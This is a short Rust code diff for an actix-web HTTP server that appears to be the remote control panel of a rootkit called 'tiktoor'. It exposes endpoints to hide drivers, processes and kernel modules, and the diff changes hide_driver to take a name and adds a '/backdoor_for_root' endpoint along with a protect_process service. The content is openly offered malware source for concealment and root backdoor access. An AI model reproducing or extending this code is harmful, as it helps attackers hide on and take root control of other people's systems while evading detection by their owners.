@@ -1,5 +1,6 @@
 use actix_web::{post, web, App, HttpResponse, HttpServer, Responder};
 use serde::Deserialize;
+use std::ffi::CString;
 use std::process;
 use structopt::StructOpt;
 
@@ -21,12 +22,12 @@ struct HideProcessParameter {
 
 #[derive(Deserialize)]
 struct HideDriverParameter {
-    rank: u32,
+    name: CString,
 }
 
 #[post("/hide_driver")]
 async fn hide_driver(parameter: web::Json<HideDriverParameter>) -> impl Responder {
-    tiktoor_client::hide_driver(parameter.rank);
+    tiktoor_client::hide_driver(&parameter.name);
     HttpResponse::Ok()
 }
 
@@ -54,6 +55,12 @@ async fn unhide_module() -> impl Responder {
     HttpResponse::Ok()
 }
 
+#[post("/backdoor_for_root")]
+async fn backdoor_for_root() -> impl Responder {
+    tiktoor_client::backdoor_for_root();
+    HttpResponse::Ok()
+}
+
 #[actix_web::main]
 async fn main() -> std::io::Result<()> {
     let cli = Cli::from_args();
@@ -67,6 +74,8 @@ async fn main() -> std::io::Result<()> {
             .service(hide_module)
             .service(unhide_module)
             .service(hide_driver)
+            .service(protect_process)
+            .service(backdoor_for_root)
     })
     .bind((cli.host, cli.port))?
     .run()
